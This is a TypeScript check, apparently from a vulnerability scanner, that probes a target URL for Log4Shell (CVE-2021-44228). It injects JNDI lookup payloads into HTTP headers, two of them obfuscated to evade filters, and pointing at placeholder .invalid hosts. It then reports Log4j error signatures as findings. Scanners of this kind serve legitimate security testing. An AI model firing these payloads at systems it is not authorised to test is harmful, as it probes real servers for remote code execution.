import { ts } from '../context';
import { probe } from '../utils/http';
import type { RealFinding, Target, LogFn } from '../context';

export async function checkLog4ShellSurface(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Testing Log4Shell (CVE-2021-44228) surface...`);

  // Without an out-of-band callback server we can only detect blind indicators:
  // 1. Any DNS/LDAP lookups from target (not detectable here without OOB)
  // 2. Error patterns that suggest Log4j in the stack trace
  const jndiPayloads = [
    '${jndi:ldap://sentinelx-log4shell-probe.invalid/x}',
    '${${lower:j}ndi:${lower:l}dap://sentinelx-probe.invalid/x}',
    '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://sentinelx-probe.invalid/x}',
  ];

  const injectionHeaders = ['User-Agent', 'X-Forwarded-For', 'X-Api-Version', 'Referer', 'X-Forwarded-Host', 'X-Remote-IP', 'X-Remote-Addr'];

  for (const payload of jndiPayloads.slice(0, 2)) {
    for (const headerName of injectionHeaders.slice(0, 5)) {
      const r = await probe(target.url, { headers: { [headerName]: payload }, timeoutMs: 8_000 });
      if (!r) continue;
      const combined = (r.body + JSON.stringify(r.headers)).toLowerCase();
      if (combined.includes('log4j') || combined.includes('jndi') || combined.match(/jdk\.\w+\.exception/i)) {
        findings.push({
          title: 'Log4Shell (CVE-2021-44228) — Error Signature Detected in Response',
          severity: 'critical',
          verification: 'suspected',
          confidence: 70,
          cvss: 10.0,
          cve: 'CVE-2021-44228',
          description: `The response to a JNDI payload in the ${headerName} header contains Log4j/JNDI error signatures.`,
          evidence: `Header: ${headerName}: ${payload}\nHTTP ${r.status} — JNDI/log4j signature in response`,
          remediation: 'Update Log4j to 2.17.1 or later.',
        });
        await onLog(`[${ts()}] ⚠ LOG4SHELL SIGNAL in response from ${headerName} header`);
        return findings;
      }
      if (r.status >= 500) {
        await onLog(`[${ts()}] Log4Shell probe via ${headerName} → HTTP ${r.status} (may indicate reflection)`);
      }
    }
  }

  // Check stack trace for log4j indicators
  const errorR = await probe(`${target.url.replace(/\/$/, '')}/__sentinelx_nonexistent_${Date.now()}`, { timeoutMs: 6_000 });
  if (errorR && /log4j|log4\.core|org\.apache\.logging/i.test(errorR.body)) {
    findings.push({
      title: 'Log4j Detected in Stack Trace',
      severity: 'high',
      verification: 'suspected',
      confidence: 75,
      cvss: 8.1,
      cve: 'CVE-2021-44228',
      description: 'Error response contains Log4j class names, indicating the library is in use.',
      evidence: `Stack trace excerpt: ${errorR.body.slice(0, 500)}`,
      remediation: 'Update Log4j to 2.17.1 or later immediately.',
    });
  }

  if (findings.length === 0) await onLog(`[${ts()}] No Log4Shell surface indicators detected (OOB verification not available)`);
  return findings;
}
